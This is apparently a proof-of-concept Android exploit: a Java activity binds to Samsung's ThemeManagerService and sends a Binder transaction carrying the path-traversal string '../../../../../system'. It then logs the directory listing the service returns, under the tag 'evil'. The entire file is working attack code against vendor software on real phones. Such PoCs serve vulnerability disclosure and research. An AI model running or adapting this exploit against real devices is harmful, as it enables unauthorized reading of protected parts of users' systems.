package poc.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

public class MainActivity extends Activity {
    public static final int TRANSACTION_getWallpaperFilePath = 44;

    private ServiceConnection mServiceConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName cName, IBinder service) {
            processBinder(service);
        }

        public void onServiceDisconnected(ComponentName cName) {
        }
    };

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setClassName("com.samsung.android.themecenter", "com.samsung.android.thememanager.ThemeManagerService");
        bindService(i, mServiceConnection, BIND_AUTO_CREATE);
    }

    private void processBinder(IBinder binder) {
        try {
            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken("com.samsung.android.thememanager.IThemeManager");
            parcel.writeString("../../../../../system");

            Parcel reply = Parcel.obtain();

            binder.transact(TRANSACTION_getWallpaperFilePath, parcel, reply, 0);
            reply.readException();
            Log.d("evil", "Listing: " + reply.createStringArrayList());
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}